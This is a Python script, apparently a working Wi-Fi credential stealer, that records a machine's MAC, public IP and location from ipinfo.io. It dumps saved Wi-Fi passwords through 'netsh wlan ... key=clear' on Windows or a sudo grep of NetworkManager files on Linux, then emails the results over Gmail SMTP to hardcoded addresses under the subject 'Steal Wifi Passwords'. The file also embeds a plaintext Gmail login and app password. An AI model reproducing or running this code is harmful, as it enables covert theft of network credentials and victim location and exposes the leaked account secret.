import os
import re
import subprocess
import smtplib
import imghdr
from email.message import EmailMessage
import uuid
import sys
import json
import urllib.request


MAC = ''
OS = ''
COMMAND_WINDOWS = "netsh wlan show profile"
COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
URL = 'http://ipinfo.io/json'


def main():
    identify()
    get_ip()
    get_passwords()
    send_mail()


def identify():
    global MAC, OS
    MAC = str((hex(uuid.getnode())))
    OS = sys.platform


def get_ip():
    file = open(MAC, 'w')
    response = urllib.request.urlopen(URL).read()
    data = json.loads(response.decode('utf-8'))
    file.write("IP = " + data['ip'] + "\n")
    file.write("ISP = " + data['org'] + "\n")
    file.write("City = " + data['city'] + "\n")
    file.write("State = " + data['region'] + "\n")
    file.write("Country = " + data['country'] + "\n")
    file.write("\n ---------------------- \n" + "\n")


def get_passwords():
    file = open(MAC, 'a')

    if OS == 'win32':
        output = subprocess.check_output(COMMAND_WINDOWS).decode('ascii').split('\n')
        SSID = list()
    # Get SSIDs
        for name in output:
            try:
                Name = name.split(':')[1].strip()  # strip() removes a leading whitespace and following '\r' character
                SSID.append(Name)
            except:
                pass

        # Get PSK of each SSID
        # SSID[0]=<blank> which when given to below check_output() causes error .
        # So the try except handles it
        for ssid in SSID:
            try:
                Password = subprocess.check_output(COMMAND_WINDOWS + ' name="' + ssid + '" key=clear').decode('ascii')
                PSK = re.findall('Key Content(.*)\n', Password)[0].strip().split(':')[1].strip()
                file.write(ssid + ',' + PSK + '\n')
                # print(ssid,'  ',PSK)
            except:
                pass

    elif OS == "linux" or OS == "linux2" or OS == "linux3":
        output = subprocess.check_output(COMMAND_LINUX, shell=True).decode('utf-8').split('\n')
        for pair in output:
            try:
                pair = re.findall(RE_LINUX, pair)[0].split(':')
                ssid = pair[0]
                psk = pair[1].split('=')[1]
                file.write(ssid + ',' + psk + '\n')
            except:
                pass

    else:
        print("No support for this OS as yet !!")

    file.close()


def send_mail():
    EMAIL_ADDRESS = "fedivb.viit@gmail.com"  # os.environ.get('EMAIL_USER')
    EMAIL_PASSWORD = "nghglptzoqtnjjur"  # os.environ.get('EMAIL_PASS')

    contacts = ["atharvadare@gmail.com" , "refruta007@gmail.com"]

    msg = EmailMessage()
    msg['Subject'] = "Steal Wifi Passwords"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = contacts

    file_size = get_file_size(MAC)
    print("Size of MAC = ", file_size)

    with open(MAC, 'r') as f:
        stuff = f.read(1521)
        msg.set_content(stuff)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)


def get_file_size(file_name):
    path = os.path.dirname(os.path.realpath(file_name))
    return os.path.getsize(path + "/" + file_name)


if __name__ == "__main__":
    main()
